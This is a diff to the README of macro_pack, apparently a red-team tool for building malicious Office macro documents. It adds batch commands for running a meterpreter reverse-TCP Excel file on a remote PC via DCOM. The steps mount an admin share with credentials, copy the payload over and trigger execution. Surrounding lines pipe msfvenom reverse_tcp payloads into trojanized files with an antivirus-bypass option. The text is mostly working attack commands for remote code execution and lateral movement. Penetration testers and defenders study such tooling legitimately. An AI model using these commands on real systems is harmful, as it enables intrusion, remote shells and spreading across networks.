@@ -146,6 +146,24 @@ msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  
 msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -P  hotpics.pptm
 ```
 
+- Execute a macro on a remote PC using DCOM
+```batch
+REM Step 1: Ensure you have enough rights
+net use  \\192.168.0.8\c$ /user:domain\username password
+
+REM Step 2: Generate document, for example here, meterpreter reverse TCP Excel file
+echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -X meter.xlsm
+REM Step 3: Copy the document  somewhere on remote share
+copy meter.xlsm "\\192.168.0.8\c$\users\username\meter.xlsm"
+REM Step 4: Execute!
+macro_pack.exe --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"
+
+REM Step 2 to 4 in one step:
+echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -X "\\192.168.0.8\c$\users\username\meter.xlsm" --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"
+
+```
+
+
 
 ## All available options
 
@@ -187,6 +205,9 @@ msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macr
                     (works with Excel documents only). The macro will then be executed anytime an Excel document is opened (even non-macro documents).
     --trojan       Inject macro in an existing MS office file. Use in conjunction with -x, -X, -w, or -W
     --stealth      Anti-debug and hiding features
+    --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
+                   This will trigger AutoOpen/Workboo_Open automatically. 
+                   If no auto start function, use --start-function option to indicate wich macro to run.
 ```
 
 ### Windows only
